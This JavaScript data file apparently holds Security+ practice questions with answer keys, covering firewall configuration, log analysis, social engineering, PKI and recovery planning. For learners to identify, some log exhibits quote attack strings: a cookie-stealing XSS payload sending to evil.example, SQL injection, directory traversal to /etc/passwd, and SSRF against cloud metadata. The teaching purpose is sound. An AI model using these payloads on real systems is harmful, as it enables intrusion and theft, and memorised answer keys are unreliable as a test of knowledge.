/* SecPlus Quest — Performance-Based Questions (PBQs). Original scenarios.
 * Task types:
 *   select : one dropdown            {t:"select", label, options, answer, why}
 *   row    : several dropdowns       {t:"row", label, fields:[{name, options, answer}], why}
 *   order  : arrange items           {t:"order", label, items:[in correct order], why}
 *   multi  : choose N                {t:"multi", label, options, answers:[...], why}
 * `answer` may be a string or an array of acceptable strings. Each dropdown / each correctly
 * placed item counts toward partial credit, just like CompTIA's PBQ scoring. */
window.PBQS = [];
window.PBQ = function (p) { window.PBQS.push(p); };

const PORTS = ["21", "22", "23", "25", "53", "80", "123", "389", "443", "445", "636", "1433", "3389"];
const PROTO = ["TCP", "UDP", "ICMP"];
const ACT = ["Allow", "Deny"];

PBQ({
  id: "fw-dmz", o: "4.5", kind: "Firewall configuration", title: "Configure the DMZ firewall",
  scenario: "A company hosts a public website on a web server in the screened subnet. The web server needs to query a Microsoft SQL database on the internal network. Administrators manage the web server with SSH, but only from the admin subnet. Internal users must be able to resolve names using the internal DNS server. Everything else must be blocked. Configure each rule so the firewall enforces this policy.",
  exhibit: { kind: "table", head: ["Host", "IP address", "Zone"], rows: [
    ["Web server", "172.16.10.10", "Screened subnet (DMZ)"], ["SQL database server", "10.10.2.20", "Internal"],
    ["DNS server", "10.10.2.53", "Internal"], ["Admin subnet", "10.10.99.0/24", "Internal"], ["Internal users", "10.10.1.0/24", "Internal"]] },
  tasks: [
    { t: "row", label: "Rule 1: Any (internet) → 172.16.10.10 (secure website)", fields: [
      { name: "Protocol", options: PROTO, answer: "TCP" }, { name: "Port", options: PORTS, answer: "443" }, { name: "Action", options: ACT, answer: "Allow" }],
      why: "Public HTTPS uses TCP 443. Only the encrypted web port needs to be open to the internet." },
    { t: "row", label: "Rule 2: 10.10.99.0/24 (admins) → 172.16.10.10 (remote management)", fields: [
      { name: "Protocol", options: PROTO, answer: "TCP" }, { name: "Port", options: PORTS, answer: "22" }, { name: "Action", options: ACT, answer: "Allow" }],
      why: "SSH is TCP 22. Restricting the source to the admin subnet applies least privilege." },
    { t: "row", label: "Rule 3: 172.16.10.10 → 10.10.2.20 (database queries)", fields: [
      { name: "Protocol", options: PROTO, answer: "TCP" }, { name: "Port", options: PORTS, answer: "1433" }, { name: "Action", options: ACT, answer: "Allow" }],
      why: "Microsoft SQL Server listens on TCP 1433. Allow only the web server to reach only the database port." },
    { t: "row", label: "Rule 4: 10.10.1.0/24 (users) → 10.10.2.53 (name resolution)", fields: [
      { name: "Protocol", options: PROTO, answer: "UDP" }, { name: "Port", options: PORTS, answer: "53" }, { name: "Action", options: ACT, answer: "Allow" }],
      why: "DNS queries use UDP 53 (TCP 53 is used for zone transfers and large responses)." },
    { t: "row", label: "Rule 5: Any → Any (everything else)", fields: [
      { name: "Protocol", options: ["Any"].concat(PROTO), answer: "Any" }, { name: "Port", options: ["Any"].concat(PORTS), answer: "Any" }, { name: "Action", options: ACT, answer: "Deny" }],
      why: "An explicit deny-all at the bottom blocks anything not specifically allowed. Rules are read top to bottom, so it must be last." },
  ],
});

PBQ({
  id: "fw-insecure", o: "4.5", kind: "Firewall configuration", title: "Replace insecure management protocols",
  scenario: "An audit found clear-text protocols in use. Security policy says: block any protocol that sends credentials in clear text, block remote desktop from the internet, and allow the secure replacements plus time synchronization. Set the action for each rule on the perimeter firewall.",
  tasks: [
    { t: "row", label: "Inbound TCP 23 (Telnet) to network devices", fields: [{ name: "Action", options: ACT, answer: "Deny" }], why: "Telnet sends everything, including passwords, in clear text. Use SSH instead." },
    { t: "row", label: "Inbound TCP 22 (SSH) from the management VPN", fields: [{ name: "Action", options: ACT, answer: "Allow" }], why: "SSH is the encrypted replacement for Telnet, and the source is limited to the management VPN." },
    { t: "row", label: "Inbound TCP 21 (FTP) to the file server", fields: [{ name: "Action", options: ACT, answer: "Deny" }], why: "FTP sends credentials in clear text. Replace it with SFTP (over SSH, TCP 22) or FTPS." },
    { t: "row", label: "Inbound TCP 3389 (RDP) from the internet", fields: [{ name: "Action", options: ACT, answer: "Deny" }], why: "Internet-exposed RDP is a top ransomware entry point. Require a VPN or RDP gateway with MFA." },
    { t: "row", label: "Outbound UDP 123 (NTP) to the time server", fields: [{ name: "Action", options: ACT, answer: "Allow" }], why: "Accurate time is required for log correlation and Kerberos." },
    { t: "row", label: "Inbound TCP 636 (LDAPS) from the VPN concentrator", fields: [{ name: "Action", options: ACT, answer: "Allow" }], why: "LDAPS (TCP 636) encrypts directory lookups, unlike plain LDAP on TCP 389." },
  ],
});

PBQ({
  id: "log-sqli", o: "2.4", kind: "Log analysis", title: "Investigate the web server log",
  scenario: "The SOC received an alert from the web application. Review the access log and answer the questions.",
  exhibit: { kind: "log", lines: [
    "1  10.4.1.22   GET /products?id=1042                           200  3812",
    "2  10.4.1.22   GET /products?id=1043                           200  3790",
    "3  203.0.113.7 GET /login                                      200  2104",
    "4  203.0.113.7 POST /login user=admin'--&pass=x                302   512",
    "5  203.0.113.7 GET /products?id=1042 UNION SELECT user,pass FROM users  200 98211",
    "6  10.4.1.31   GET /images/logo.png                            200  1450"] },
  tasks: [
    { t: "select", label: "Which log line shows data being stolen?", options: ["Line 1", "Line 3", "Line 4", "Line 5", "Line 6"], answer: "Line 5", why: "Line 5 uses UNION SELECT to pull usernames and passwords, and the response is about 98 KB, far larger than a normal product page." },
    { t: "select", label: "What type of attack is this?", options: ["SQL injection", "Cross-site scripting", "Directory traversal", "Buffer overflow", "CSRF"], answer: "SQL injection", why: "admin'-- comments out the password check (line 4), and UNION SELECT appends a second query (line 5). Both are SQL injection." },
    { t: "select", label: "Which fix BEST prevents this class of attack?", options: ["Parameterized queries", "A longer admin password", "Disabling HTTP GET", "A wildcard TLS certificate", "Blocking ICMP"], answer: "Parameterized queries", why: "Prepared statements keep user input from ever being executed as SQL. A WAF and input validation add defense in depth." },
  ],
});

PBQ({
  id: "log-spray", o: "2.4", kind: "Log analysis", title: "Analyze authentication failures",
  scenario: "Overnight, the identity provider logged an unusual pattern. Review the authentication log.",
  exhibit: { kind: "log", lines: [
    "02:01:14  FAIL  user=a.brown     src=198.51.100.44  reason=bad_password",
    "02:01:15  FAIL  user=c.diaz      src=198.51.100.44  reason=bad_password",
    "02:01:15  FAIL  user=j.okafor    src=198.51.100.44  reason=bad_password",
    "02:01:16  FAIL  user=m.lee       src=198.51.100.44  reason=bad_password",
    "02:01:17  OK    user=t.nguyen    src=198.51.100.44  mfa=none",
    "02:01:17  FAIL  user=r.smith     src=198.51.100.44  reason=bad_password"] },
  tasks: [
    { t: "select", label: "What attack is shown?", options: ["Password spraying", "Brute force on one account", "Pass the hash", "Replay attack", "Credential harvesting via phishing"], answer: "Password spraying", why: "One source tries one password against many accounts once each, which stays under each account's lockout threshold." },
    { t: "select", label: "Which account is MOST likely compromised?", options: ["a.brown", "c.diaz", "t.nguyen", "r.smith"], answer: "t.nguyen", why: "t.nguyen authenticated successfully from the attacking IP, and with no MFA." },
    { t: "select", label: "What should the analyst do FIRST?", options: ["Disable/reset t.nguyen's credentials and block 198.51.100.44", "Run a full vulnerability scan", "Email all users about phishing", "Rebuild the identity provider"], answer: "Disable/reset t.nguyen's credentials and block 198.51.100.44", why: "Containment comes first: stop the compromised account and the source. Then investigate and enforce MFA." },
    { t: "select", label: "Which control would have BEST prevented this success?", options: ["Multifactor authentication", "Longer password history", "Account lockout after 10 tries", "Disabling SSO"], answer: "Multifactor authentication", why: "Spraying deliberately avoids lockouts. MFA means a guessed password alone isn't enough." },
  ],
});

PBQ({
  id: "log-exfil", o: "4.9", kind: "Log analysis", title: "Review firewall and NetFlow data",
  scenario: "A finance workstation (10.20.5.44) triggered a SIEM alert. Review the summarized flow records.",
  exhibit: { kind: "log", lines: [
    "09:12  10.20.5.44 → 10.20.1.10:445   SMB     4 MB   file server (normal)",
    "11:40  10.20.5.44 → 52.84.10.3:443   HTTPS   2 MB   SaaS payroll (normal)",
    "03:07  10.20.5.44 → 185.220.101.9:443 HTTPS  6.2 GB  unknown destination",
    "03:09  10.20.5.44 → 10.20.1.10:445   SMB     5.9 GB  file server, finance share",
    "03:30  10.20.5.44 → 185.220.101.9:443 HTTPS  6.1 GB  unknown destination"] },
  tasks: [
    { t: "select", label: "Which indicator of compromise is MOST evident?", options: ["Data exfiltration", "Impossible travel", "Account lockout", "Resource inaccessibility", "Missing logs"], answer: "Data exfiltration", why: "Gigabytes pulled from the file share and sent to an unknown external IP at 3 AM is classic exfiltration." },
    { t: "select", label: "Which data source BEST shows WHAT was sent?", options: ["Packet capture", "NetFlow", "Vulnerability scan", "Asset inventory"], answer: "Packet capture", why: "NetFlow shows who talked to whom and how much. Packet captures contain the payloads, though HTTPS content needs decryption or endpoint evidence." },
    { t: "select", label: "What is the BEST immediate response?", options: ["Isolate the workstation from the network", "Reimage the file server", "Notify customers", "Delete the finance share"], answer: "Isolate the workstation from the network", why: "Contain first to stop ongoing exfiltration (EDR isolation or NAC quarantine) while preserving evidence." },
  ],
});

PBQ({
  id: "log-web", o: "2.4", kind: "Log analysis", title: "Identify the web application attacks",
  scenario: "A WAF in detection-only mode logged the following requests. Identify each attack.",
  exhibit: { kind: "log", lines: [
    "A  GET /download?file=../../../../etc/passwd",
    "B  POST /comments body=<script>fetch('//evil.example/?c='+document.cookie)</script>",
    "C  GET /fetch?url=http://169.254.169.254/latest/meta-data/",
    "D  GET /search?q=' OR '1'='1"] },
  tasks: [
    { t: "select", label: "Request A", options: ["Directory traversal", "Stored XSS", "SSRF", "SQL injection", "CSRF"], answer: "Directory traversal", why: "../ sequences try to climb out of the web root to read /etc/passwd." },
    { t: "select", label: "Request B", options: ["Directory traversal", "Stored XSS", "SSRF", "SQL injection", "CSRF"], answer: "Stored XSS", why: "A script saved in a comment runs in every viewer's browser and sends their cookies to the attacker." },
    { t: "select", label: "Request C", options: ["Directory traversal", "Stored XSS", "SSRF", "SQL injection", "CSRF"], answer: "SSRF", why: "It tricks the server into requesting the cloud metadata service, an internal address the attacker can't reach directly." },
    { t: "select", label: "Request D", options: ["Directory traversal", "Stored XSS", "SSRF", "SQL injection", "CSRF"], answer: "SQL injection", why: "' OR '1'='1 makes the query condition always true." },
  ],
});

PBQ({
  id: "place-net", o: "3.2", kind: "Network placement", title: "Place the security devices",
  scenario: "You're designing a secure network for a company with a public e-commerce site. Place each device in the BEST location.",
  exhibit: { kind: "text", text: "Internet  ⇄  [Perimeter firewall]  ⇄  Screened subnet (DMZ)  ⇄  [Internal firewall]  ⇄  Internal network\n                                                                     ⇣\n                                                            Management network" },
  tasks: [
    { t: "select", label: "Web servers for the public store", options: ["Screened subnet", "Internal network", "Management network", "In front of the perimeter firewall"], answer: "Screened subnet", why: "Public-facing services go in the DMZ so a compromise doesn't land directly on the internal network." },
    { t: "select", label: "Web application firewall (WAF)", options: ["In front of the web servers", "Next to the database", "On the management network", "On each user laptop"], answer: "In front of the web servers", why: "A WAF inspects HTTP/S traffic before it reaches the web servers." },
    { t: "select", label: "Customer database", options: ["Screened subnet", "Internal network", "Internet edge", "Guest Wi-Fi"], answer: "Internal network", why: "Sensitive data stays behind the internal firewall, reachable only from the web tier on the database port." },
    { t: "select", label: "Jump server for administrators", options: ["Management network", "Screened subnet", "Internet edge", "Internal user VLAN"], answer: "Management network", why: "Admins connect to a hardened, monitored jump server, which is the only path into management interfaces." },
    { t: "select", label: "Load balancer for the store", options: ["In front of the web servers", "Behind the database", "On the management network", "On the guest network"], answer: "In front of the web servers", why: "It distributes incoming requests across the web servers and can offload TLS." },
    { t: "select", label: "Network IDS sensor", options: ["On a SPAN port/tap", "Inline as the only firewall", "On the guest Wi-Fi", "Inside the database"], answer: "On a SPAN port/tap", why: "An IDS is passive: it watches a copy of traffic from a tap or port mirror and alerts. An IPS sits inline." },
  ],
});

PBQ({
  id: "match-phish", o: "2.2", kind: "Match the attack", title: "Identify the social engineering attack",
  scenario: "Match each scenario to the social engineering technique being used.",
  tasks: [
    { t: "select", label: "A text message says your package is held and links to a fake delivery site.", options: ["Smishing", "Vishing", "Whaling", "Business email compromise", "Typosquatting", "Watering hole"], answer: "Smishing", why: "Phishing by SMS text is smishing." },
    { t: "select", label: "A caller claims to be from the bank's fraud department and asks you to read back a code.", options: ["Smishing", "Vishing", "Whaling", "Business email compromise", "Typosquatting", "Watering hole"], answer: "Vishing", why: "Voice phishing, often with caller ID spoofing." },
    { t: "select", label: "A tailored email to the CFO references a real pending acquisition.", options: ["Smishing", "Vishing", "Whaling", "Business email compromise", "Typosquatting", "Watering hole"], answer: "Whaling", why: "Spear phishing aimed at an executive is whaling." },
    { t: "select", label: "A 'vendor' emails accounts payable with new wire transfer instructions.", options: ["Smishing", "Vishing", "Whaling", "Business email compromise", "Typosquatting", "Watering hole"], answer: "Business email compromise", why: "BEC redirects payments. Verify any banking change by calling a known number." },
    { t: "select", label: "Users who mistype the company's domain land on a look-alike login page.", options: ["Smishing", "Vishing", "Whaling", "Business email compromise", "Typosquatting", "Watering hole"], answer: "Typosquatting", why: "Typosquatting (URL hijacking) registers look-alike or misspelled domains." },
    { t: "select", label: "An industry association's website is compromised to infect its members.", options: ["Smishing", "Vishing", "Whaling", "Business email compromise", "Typosquatting", "Watering hole"], answer: "Watering hole", why: "The attacker poisons a site the targets already trust and visit." },
  ],
});

PBQ({
  id: "match-controls", o: "1.1", kind: "Classify the controls", title: "Control category and type",
  scenario: "For each control, select its category AND its type.",
  tasks: [
    { t: "row", label: "A firewall rule blocking inbound Telnet", fields: [
      { name: "Category", options: ["Technical", "Managerial", "Operational", "Physical"], answer: "Technical" },
      { name: "Type", options: ["Preventive", "Deterrent", "Detective", "Corrective", "Compensating", "Directive"], answer: "Preventive" }], why: "It's implemented in technology and stops the traffic." },
    { t: "row", label: "An acceptable use policy employees must sign", fields: [
      { name: "Category", options: ["Technical", "Managerial", "Operational", "Physical"], answer: "Managerial" },
      { name: "Type", options: ["Preventive", "Deterrent", "Detective", "Corrective", "Compensating", "Directive"], answer: "Directive" }], why: "Policies are managerial and tell people what to do." },
    { t: "row", label: "Motion-activated cameras recording the server room", fields: [
      { name: "Category", options: ["Technical", "Managerial", "Operational", "Physical"], answer: "Physical" },
      { name: "Type", options: ["Preventive", "Deterrent", "Detective", "Corrective", "Compensating", "Directive"], answer: "Detective" }], why: "They protect a physical space and record or identify events." },
    { t: "row", label: "Restoring a server from backup after ransomware", fields: [
      { name: "Category", options: ["Technical", "Managerial", "Operational", "Physical"], answer: ["Technical", "Operational"] },
      { name: "Type", options: ["Preventive", "Deterrent", "Detective", "Corrective", "Compensating", "Directive"], answer: "Corrective" }], why: "Corrective controls restore operations after an event. A backup system is technical, and the restore process is operational, so both count." },
    { t: "row", label: "Isolating an unpatchable legacy system on its own VLAN", fields: [
      { name: "Category", options: ["Technical", "Managerial", "Operational", "Physical"], answer: "Technical" },
      { name: "Type", options: ["Preventive", "Deterrent", "Detective", "Corrective", "Compensating", "Directive"], answer: "Compensating" }], why: "It's a substitute control used because the primary one (patching) isn't possible." },
  ],
});

PBQ({
  id: "order-ir", o: "4.8", kind: "Put in order", title: "Incident response lifecycle",
  scenario: "Arrange the incident response phases in the correct order.",
  tasks: [{ t: "order", label: "First to last", items: ["Preparation", "Detection", "Analysis", "Containment", "Eradication", "Recovery", "Lessons learned"], why: "Prepare, detect and analyze, contain, eradicate, recover, then hold a lessons-learned review to improve." }],
});

PBQ({
  id: "order-vol", o: "4.8", kind: "Put in order", title: "Order of volatility",
  scenario: "A forensic investigator must collect evidence from a running server. Order the sources from MOST volatile (collect first) to LEAST volatile.",
  tasks: [{ t: "order", label: "Most volatile → least volatile", items: ["CPU registers and cache", "RAM (system memory)", "Temporary files and swap/page file", "Local disk drive", "Remote logs on the SIEM", "Archived backup tapes"], why: "Collect what disappears first: registers and cache, then RAM, then temporary data, then disk, remote logs, and archives (RFC 3227)." }],
});

PBQ({
  id: "order-vuln", o: "4.3", kind: "Prioritize", title: "Prioritize vulnerability remediation",
  scenario: "Your scanner produced these findings. Order them from HIGHEST to LOWEST remediation priority.",
  exhibit: { kind: "table", head: ["Finding", "CVSS", "Asset", "Notes"], rows: [
    ["RCE in VPN appliance", "9.8", "Internet-facing", "Actively exploited in the wild"],
    ["SQL injection in HR app", "8.6", "Internal only", "Holds employee PII"],
    ["Outdated TLS 1.0 enabled", "5.3", "Internet-facing", "No known exploit"],
    ["Missing patch on lab PC", "7.5", "Isolated test lab", "No network path to production"]] },
  tasks: [{ t: "order", label: "Highest priority → lowest", items: ["RCE in VPN appliance", "SQL injection in HR app", "Outdated TLS 1.0 enabled", "Missing patch on lab PC"], why: "Combine severity with exposure and exploitation: an exploited, internet-facing critical flaw comes first, and an isolated lab PC comes last despite its 7.5 base score." }],
});

PBQ({
  id: "match-malware", o: "2.4", kind: "Match the malware", title: "Identify the malware from the indicators",
  scenario: "Match each indicator to the MOST likely type of malware.",
  tasks: [
    { t: "select", label: "Files renamed with a .locked extension and a note demanding cryptocurrency", options: ["Ransomware", "Worm", "Keylogger", "Rootkit", "Logic bomb", "Trojan"], answer: "Ransomware", why: "It encrypts data and demands payment." },
    { t: "select", label: "Dozens of hosts infected within minutes over SMB, with no user action", options: ["Ransomware", "Worm", "Keylogger", "Rootkit", "Logic bomb", "Trojan"], answer: "Worm", why: "Worms self-propagate through network vulnerabilities." },
    { t: "select", label: "A process that Task Manager can't see, found only from a boot-time scan", options: ["Ransomware", "Worm", "Keylogger", "Rootkit", "Logic bomb", "Trojan"], answer: "Rootkit", why: "Rootkits modify the OS or kernel to hide." },
    { t: "select", label: "Payroll data deleted on the date a developer was removed from payroll", options: ["Ransomware", "Worm", "Keylogger", "Rootkit", "Logic bomb", "Trojan"], answer: "Logic bomb", why: "It waited for a trigger event or date." },
    { t: "select", label: "A free PDF converter that also opened a remote access backdoor", options: ["Ransomware", "Worm", "Keylogger", "Rootkit", "Logic bomb", "Trojan"], answer: "Trojan", why: "It pretends to be legitimate software and carries a hidden payload (a RAT)." },
    { t: "select", label: "Bank logins stolen even though the site uses HTTPS", options: ["Ransomware", "Worm", "Keylogger", "Rootkit", "Logic bomb", "Trojan"], answer: "Keylogger", why: "Keystrokes are captured before encryption happens." },
  ],
});

PBQ({
  id: "match-pki", o: "1.4", kind: "Match the concept", title: "Certificates and PKI",
  scenario: "Select the PKI feature or certificate type that BEST fits each requirement.",
  tasks: [
    { t: "select", label: "One certificate for www, shop, and mail under example.com", options: ["Wildcard certificate", "Self-signed certificate", "OCSP stapling", "Certificate revocation list", "Certificate signing request", "Key escrow"], answer: "Wildcard certificate", why: "*.example.com covers first-level subdomains. A SAN certificate can also list names explicitly." },
    { t: "select", label: "Let browsers check revocation without each one contacting the CA", options: ["Wildcard certificate", "Self-signed certificate", "OCSP stapling", "Certificate revocation list", "Certificate signing request", "Key escrow"], answer: "OCSP stapling", why: "The server includes a CA-signed OCSP status in the TLS handshake." },
    { t: "select", label: "Request a new certificate from a CA without sending the private key", options: ["Wildcard certificate", "Self-signed certificate", "OCSP stapling", "Certificate revocation list", "Certificate signing request", "Key escrow"], answer: "Certificate signing request", why: "A CSR contains the public key and identity details. The private key never leaves." },
    { t: "select", label: "A published list of every certificate the CA has revoked", options: ["Wildcard certificate", "Self-signed certificate", "OCSP stapling", "Certificate revocation list", "Certificate signing request", "Key escrow"], answer: "Certificate revocation list", why: "A CRL is the full revocation list, downloaded and checked by clients." },
    { t: "select", label: "Recover encrypted data if an employee loses their private key", options: ["Wildcard certificate", "Self-signed certificate", "OCSP stapling", "Certificate revocation list", "Certificate signing request", "Key escrow"], answer: "Key escrow", why: "A trusted party holds copies of keys for recovery." },
  ],
});

PBQ({
  id: "wifi", o: "4.1", kind: "Configure wireless", title: "Secure the enterprise Wi-Fi",
  scenario: "Configure a new corporate wireless network. Employees must authenticate with their own directory credentials or certificates, and the network must resist offline cracking and deauthentication attacks.",
  tasks: [
    { t: "select", label: "Security mode", options: ["WPA3-Enterprise", "WPA3-Personal", "WPA2-Personal (PSK)", "WEP", "Open"], answer: "WPA3-Enterprise", why: "Enterprise mode authenticates each user individually through 802.1X." },
    { t: "select", label: "Authentication method", options: ["EAP-TLS with certificates", "Shared passphrase", "MAC filtering only", "Captive portal only"], answer: "EAP-TLS with certificates", why: "EAP-TLS uses certificates for strong mutual authentication." },
    { t: "select", label: "Authentication server", options: ["RADIUS", "DHCP", "DNS", "NTP"], answer: "RADIUS", why: "The AP (authenticator) forwards credentials to a RADIUS server." },
    { t: "select", label: "Wi-Fi Protected Setup (WPS)", options: ["Disabled", "Enabled with PIN", "Enabled with push button"], answer: "Disabled", why: "WPS PIN mode can be brute forced quickly. Turn it off." },
    { t: "select", label: "Management frame protection (802.11w)", options: ["Required", "Disabled", "Optional"], answer: "Required", why: "Protected Management Frames stop deauthentication attacks, and they're mandatory in WPA3." },
  ],
});

PBQ({
  id: "multi-sqli", o: "2.5", kind: "Choose two", title: "Mitigate injection attacks",
  scenario: "A development team wants to prevent SQL injection in a customer portal. Which TWO controls are MOST effective?",
  tasks: [{ t: "multi", label: "Select TWO", options: ["Parameterized queries/prepared statements", "Server-side input validation", "Increase the TLS key length", "Enable full-disk encryption on the database", "Change the database port from 1433", "Require longer user passwords"], answers: ["Parameterized queries/prepared statements", "Server-side input validation"], why: "Prepared statements separate code from data, and input validation rejects malformed input. Encryption, ports, and passwords don't stop injection." }],
});

PBQ({
  id: "multi-mfa", o: "4.6", kind: "Choose two", title: "Something you have",
  scenario: "A company wants to add a 'something you have' factor to password logins. Which TWO options qualify?",
  tasks: [{ t: "multi", label: "Select TWO", options: ["FIDO2 hardware security key", "Authenticator app on a company phone", "Fingerprint scan", "Security question", "A longer PIN", "Login allowed only from the office IP range"], answers: ["FIDO2 hardware security key", "Authenticator app on a company phone"], why: "Possession factors include hardware keys, smart cards, and tokens on a device. A fingerprint is 'something you are,' security questions and PINs are 'something you know,' and location is 'somewhere you are.'" }],
});

PBQ({
  id: "risk-calc", o: "5.2", kind: "Risk calculation", title: "Calculate the risk",
  scenario: "A warehouse system is valued at $50,000. A flood would destroy 40% of its value. Floods are expected once every 2 years. A flood insurance policy costs $3,000 per year.",
  tasks: [
    { t: "select", label: "Single loss expectancy (SLE)", options: ["$20,000", "$10,000", "$50,000", "$40,000", "$5,000"], answer: "$20,000", why: "SLE = AV × EF = $50,000 × 0.40 = $20,000." },
    { t: "select", label: "Annualized rate of occurrence (ARO)", options: ["0.5", "2", "0.2", "1"], answer: "0.5", why: "Once every 2 years means ARO = 1/2 = 0.5." },
    { t: "select", label: "Annualized loss expectancy (ALE)", options: ["$10,000", "$20,000", "$40,000", "$5,000"], answer: "$10,000", why: "ALE = SLE × ARO = $20,000 × 0.5 = $10,000 per year." },
    { t: "select", label: "Buying the $3,000 policy is which risk strategy, and is it cost-justified?", options: ["Transfer; yes, it costs less than the ALE", "Avoid; yes", "Accept; no", "Mitigate; no, it costs more than the ALE"], answer: "Transfer; yes, it costs less than the ALE", why: "Insurance transfers financial risk. $3,000 a year to cover an expected $10,000 a year in losses is justified." },
  ],
});

PBQ({
  id: "data-states", o: "3.3", kind: "Match the concept", title: "Protect the data",
  scenario: "Choose the data state AND the BEST protection for each situation.",
  tasks: [
    { t: "row", label: "Customer records stored in a database on a server's drives", fields: [
      { name: "State", options: ["At rest", "In transit", "In use"], answer: "At rest" },
      { name: "Protection", options: ["Database/full-disk encryption", "TLS", "Secure enclave"], answer: "Database/full-disk encryption" }], why: "Stored data is protected with encryption at rest." },
    { t: "row", label: "A browser submitting a credit card number to the checkout page", fields: [
      { name: "State", options: ["At rest", "In transit", "In use"], answer: "In transit" },
      { name: "Protection", options: ["Database/full-disk encryption", "TLS", "Secure enclave"], answer: "TLS" }], why: "Data moving across the network is protected by TLS or IPsec." },
    { t: "row", label: "A phone matching a fingerprint while unlocking", fields: [
      { name: "State", options: ["At rest", "In transit", "In use"], answer: "In use" },
      { name: "Protection", options: ["Database/full-disk encryption", "TLS", "Secure enclave"], answer: "Secure enclave" }], why: "Data being processed is protected in isolated hardware like a secure enclave." },
  ],
});

PBQ({
  id: "access-models", o: "4.6", kind: "Match the concept", title: "Choose the access control model",
  scenario: "Select the access control model each organization is using.",
  tasks: [
    { t: "select", label: "Nurses can open patient charts because of their job function.", options: ["RBAC", "MAC", "DAC", "ABAC", "Rule-based"], answer: "RBAC", why: "Permissions come from the role." },
    { t: "select", label: "Documents labeled Secret can only be read by users with Secret clearance or higher.", options: ["RBAC", "MAC", "DAC", "ABAC", "Rule-based"], answer: "MAC", why: "Labels and clearances are set by administrators." },
    { t: "select", label: "A file's owner decides which coworkers can edit it.", options: ["RBAC", "MAC", "DAC", "ABAC", "Rule-based"], answer: "DAC", why: "The owner controls permissions." },
    { t: "select", label: "Access is allowed if department=Finance AND the device is managed AND it's business hours.", options: ["RBAC", "MAC", "DAC", "ABAC", "Rule-based"], answer: "ABAC", why: "It combines multiple attributes about the user, the device, and the environment." },
    { t: "select", label: "The lab network denies all connections between midnight and 6 AM for everyone.", options: ["RBAC", "MAC", "DAC", "ABAC", "Rule-based"], answer: "Rule-based", why: "A system-wide rule set by admins applies regardless of identity." },
  ],
});

PBQ({
  id: "secure-protocols", o: "4.5", kind: "Match the concept", title: "Pick the secure replacement",
  scenario: "Replace each insecure protocol with its secure alternative.",
  tasks: [
    { t: "select", label: "Telnet", options: ["SSH", "SFTP", "HTTPS", "LDAPS", "SNMPv3", "IMAPS"], answer: "SSH", why: "SSH provides an encrypted remote shell (TCP 22)." },
    { t: "select", label: "FTP", options: ["SSH", "SFTP", "HTTPS", "LDAPS", "SNMPv3", "IMAPS"], answer: "SFTP", why: "SFTP transfers files over SSH. FTPS is another option." },
    { t: "select", label: "HTTP", options: ["SSH", "SFTP", "HTTPS", "LDAPS", "SNMPv3", "IMAPS"], answer: "HTTPS", why: "HTTPS is HTTP over TLS (TCP 443)." },
    { t: "select", label: "LDAP", options: ["SSH", "SFTP", "HTTPS", "LDAPS", "SNMPv3", "IMAPS"], answer: "LDAPS", why: "LDAPS uses TLS on TCP 636." },
    { t: "select", label: "SNMPv1/v2c", options: ["SSH", "SFTP", "HTTPS", "LDAPS", "SNMPv3", "IMAPS"], answer: "SNMPv3", why: "SNMPv3 adds authentication and encryption." },
    { t: "select", label: "IMAP", options: ["SSH", "SFTP", "HTTPS", "LDAPS", "SNMPv3", "IMAPS"], answer: "IMAPS", why: "IMAP over TLS uses TCP 993." },
  ],
});

PBQ({
  id: "dr-plan", o: "3.4", kind: "Recovery planning", title: "Design the recovery plan",
  scenario: "An online retailer can lose no more than 15 minutes of order data and must be back online within 1 hour after a regional disaster. Budget is approved for whatever meets these targets.",
  tasks: [
    { t: "select", label: "The 15-minute data loss limit is the…", options: ["Recovery point objective (RPO)", "Recovery time objective (RTO)", "MTBF", "MTTR"], answer: "Recovery point objective (RPO)", why: "RPO is acceptable data loss, measured in time." },
    { t: "select", label: "The 1-hour target is the…", options: ["Recovery point objective (RPO)", "Recovery time objective (RTO)", "MTBF", "Exposure factor"], answer: "Recovery time objective (RTO)", why: "RTO is the maximum time to restore service." },
    { t: "select", label: "Which recovery site meets the targets?", options: ["Hot site in another region", "Warm site in the same building", "Cold site in another region", "No site; restore from tape"], answer: "Hot site in another region", why: "Only a hot site, with geographic dispersion, can be live within an hour." },
    { t: "select", label: "Which data protection method meets a 15-minute RPO?", options: ["Near-real-time replication", "Weekly full backups", "Monthly tape archives", "Annual snapshots"], answer: "Near-real-time replication", why: "Replication or very frequent snapshots keep the loss window under 15 minutes." },
  ],
});

PBQ({
  id: "email-auth", o: "4.5", kind: "Configure email security", title: "Stop domain spoofing",
  scenario: "Attackers are spoofing your domain in phishing emails. Configure email authentication.",
  tasks: [
    { t: "select", label: "List the servers allowed to send mail for the domain", options: ["SPF", "DKIM", "DMARC", "S/MIME"], answer: "SPF", why: "SPF lists the domain's authorized sending servers." },
    { t: "select", label: "Digitally sign outgoing messages, verified with a public key in DNS", options: ["SPF", "DKIM", "DMARC", "S/MIME"], answer: "DKIM", why: "DKIM signatures prove the message came from the domain and wasn't altered." },
    { t: "select", label: "Tell receivers to reject mail that fails checks, and send reports", options: ["SPF", "DKIM", "DMARC", "S/MIME"], answer: "DMARC", why: "DMARC publishes the policy (none, quarantine, or reject) and reporting addresses." },
    { t: "select", label: "Which DNS record type holds all three?", options: ["TXT", "MX", "A", "PTR"], answer: "TXT", why: "SPF, DKIM keys, and DMARC policies are published in TXT records." },
  ],
});

PBQ({
  id: "multi-hardening", o: "4.1", kind: "Choose three", title: "Harden a new server",
  scenario: "A new Linux web server is about to go into production. Which THREE actions BEST harden it?",
  tasks: [{ t: "multi", label: "Select THREE", options: ["Disable unused services and close unneeded ports", "Disable direct root login and use sudo", "Apply current patches and a secure baseline (e.g., CIS)", "Enable Telnet for emergency access", "Keep the default admin password for vendor support", "Install every available package in case it's needed later"], answers: ["Disable unused services and close unneeded ports", "Disable direct root login and use sudo", "Apply current patches and a secure baseline (e.g., CIS)"], why: "Hardening reduces the attack surface: remove what you don't need, protect privileged access, patch, and apply a baseline." }],
});
